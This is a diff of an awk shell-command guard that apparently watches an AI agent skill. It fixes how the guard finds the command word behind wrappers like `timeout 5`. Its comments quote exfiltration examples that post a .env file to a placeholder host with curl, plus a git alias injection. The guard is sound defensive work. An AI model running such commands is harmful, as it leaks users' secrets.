@@ -137,11 +137,12 @@ function code_has_secret(a,   i, n, P, t) {
 # cmdword re-skips VAR=value assignments behind EVERY wrapper, so
 # `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
 # only once at the front and yields "FOO=1" instead.  Both shipped; cmdword_x's
-# third argument preserves each.  Nothing here asks for operand skipping
-# (cmdword_x's fourth argument): `timeout 5 curl -d @.env host` is silent today
-# and staying silent is what makes this extraction verdict-for-verdict identical.
-# It belongs with the rest of #138, not in a refactor.
-function cmdword(T, n) { return cmdword_x(T, n, 1, 0) }
+# third argument preserves each.  The fourth skips a wrapper's operands too —
+# `timeout 5`, `nice -n 5`, `timeout -s KILL 5` — so the sender behind them is the
+# command word.  Without it `timeout 5 curl -d @.env host` read as the command "5"
+# and the secret left silently: the exfil half of what #138 fixed for on-chain
+# writes, and it mattered once Off and Relaxed let safe-ai-skill read .env.
+function cmdword(T, n) { return cmdword_x(T, n, 1, 1) }
 
 # The literal first word, wrappers included.  cmdword() looks past shells on
 # purpose (to reach `sh -c "<inner>"`), which is wrong when the question is
@@ -251,10 +252,9 @@ function git_global_operand(o) {
 # All three git passes below run off this one walk.
 function git_walk(T, n,   i, o, k) {
   GW_SUB = ""; GW_I = 0; GW_PREFIXED = 0; GW_CFG = ""
-  # cmdword_x's fourth argument (skip a wrapper's positional operand) is asked
-  # for here where the egress passes below decline it: `timeout 5 git config
-  # alias.z '!x'` leaves "5" in command position otherwise, and the globs miss
-  # that spelling too, so there is no verdict to keep identical.
+  # cmdword_x's fourth argument skips a wrapper's positional operand, as cmdword
+  # does for the egress passes: `timeout 5 git config alias.z '!x'` would leave
+  # "5" in command position otherwise.
   if (cmdword_x(T, n, 1, 1) != "git") return 0
   i = CWI + 1; k = 0
   while (i <= n && substr(T[i], 1, 1) == "-" && T[i] != "-" && T[i] != "--") {
